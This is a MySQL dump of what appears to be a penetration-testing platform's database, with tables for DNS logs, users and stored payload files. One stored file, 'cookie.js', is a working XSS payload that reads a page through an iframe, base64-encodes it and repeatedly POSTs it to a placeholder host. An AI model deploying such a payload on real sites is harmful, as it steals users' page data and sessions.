/*
 Navicat Premium Data Transfer

 Source Server         : 127.0.0.1
 Source Server Type    : MySQL
 Source Server Version : 80013
 Source Host           : localhost:3306
 Source Schema         : node

 Target Server Type    : MySQL
 Target Server Version : 80013
 File Encoding         : 65001

 Date: 18/01/2019 17:01:10
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for dnslogs
-- ----------------------------
DROP TABLE IF EXISTS `dnslogs`;
CREATE TABLE `dnslogs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `time` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `log` varchar(1000) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `hash` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- ----------------------------
-- Records of dnslogs
-- ----------------------------
BEGIN;
INSERT INTO `dnslogs` VALUES (1, '2019-01-18 16:46:13', 'p0desta.explog.ga', 'c4ca4238a0b923820dcc509a6f75849b');
INSERT INTO `dnslogs` VALUES (2, '2019-01-17 20:43:23', 'root.explog.ga', NULL);
COMMIT;

-- ----------------------------
-- Table structure for files
-- ----------------------------
DROP TABLE IF EXISTS `files`;
CREATE TABLE `files` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `filename` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `code` mediumtext CHARACTER SET utf8 COLLATE utf8_general_ci,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of files
-- ----------------------------
BEGIN;
INSERT INTO `files` VALUES (7, 'cookie.js', '打cookie', 'function send(e) {\n    var t = new XMLHttpRequest;\n    t.open(\"POST\", \"https://xxxx.com\", !0), t.setRequestHeader(\"Content-type\", \"text/plain\"), t.onreadystatechange = function() {\n        4 == t.readyState && t.status\n    }, t.send(e)\n}\nvar iframe = document.createElement(\"iframe\");\niframe.src = \"/home/publiclist\";\ndocument.body.appendChild(iframe);\niframe.onload = setInterval(function() {\n    var c = encodeURI(document.getElementsByTagName(\"iframe\")[0].contentWindow.document.getElementsByTagName(\"body\")[0].innerHTML);\n    send(btoa(c));\n}, 2)');
INSERT INTO `files` VALUES (10, 'shell.php', 'ccc', '<?php phpinfo();?>');
COMMIT;

-- ----------------------------
-- Table structure for infos
-- ----------------------------
DROP TABLE IF EXISTS `infos`;
CREATE TABLE `infos` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `info` varchar(3000) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=17 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;


-- ----------------------------
-- Table structure for users
-- ----------------------------
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `password` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of users
-- ----------------------------
BEGIN;
INSERT INTO `users` VALUES (1, 'pnode', '58cdb1fef47f84616a6cd0d7056a58ee');
COMMIT;

SET FOREIGN_KEY_CHECKS = 1;
